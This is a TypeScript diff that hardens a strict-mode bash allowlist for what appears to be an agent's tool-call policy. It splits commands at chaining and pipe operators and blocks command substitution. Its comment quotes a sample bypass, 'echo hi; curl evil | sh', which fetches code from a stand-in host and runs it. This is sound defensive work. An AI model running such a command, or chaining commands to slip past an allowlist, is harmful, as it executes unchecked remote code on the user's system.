@@ -61,6 +61,24 @@ function withinRoots(target: string, roots: string[]): boolean {
   });
 }
 
+/**
+ * Split a shell command into its simple-command segments at sequencing,
+ * chaining, and pipeline operators so strict-mode allowlisting checks every
+ * executed command — not just the first (`echo hi; curl evil | sh` used to
+ * pass as `echo `). Quoted operators cause false denials here, which is the
+ * acceptable direction for a hardened mode.
+ */
+function shellSegments(cmd: string): string[] {
+  return cmd
+    .split(/\n|\r|&&|\|\||\|(?!\|)|(?<!>)&(?!>)/)
+    .map((segment) => segment.trim())
+    .filter((segment) => segment.length > 0);
+}
+
+/** Command/substitution syntax that can execute an unchecked program from
+ * inside an allowlisted command word. */
+const SHELL_SUBSTITUTION = /(\$\(|<\(|>\(|`)/;
+
 export function authorizeToolCall(policy: ToolPolicy, name: string, args: Record<string, unknown>): PolicyDecision {
   if (policy.level === 'off') return { ok: true };
 
@@ -90,8 +108,14 @@ export function authorizeToolCall(policy: ToolPolicy, name: string, args: Record
     if (!withinRoots(cwd, policy.allowedReadRoots)) {
       return { ok: false, ruleId: 'cwd_outside_workspace', reason: `Working directory not allowed: ${cwdArg}` };
     }
-    if (policy.level === 'strict' && !policy.bashAllowlist.some((ok) => cmd.startsWith(ok))) {
-      return { ok: false, ruleId: 'bash_not_allowlisted', reason: `Command not allowlisted: ${cmd}` };
+    if (policy.level === 'strict') {
+      if (SHELL_SUBSTITUTION.test(cmd)) {
+        return { ok: false, ruleId: 'bash_substitution', reason: 'Command substitution is not allowed in strict mode: ' + cmd };
+      }
+      const unapproved = shellSegments(cmd).find((segment) => !policy.bashAllowlist.some((ok) => segment.startsWith(ok)));
+      if (unapproved !== undefined) {
+        return { ok: false, ruleId: 'bash_not_allowlisted', reason: `Command not allowlisted: ${unapproved}` };
+      }
     }
   }
 
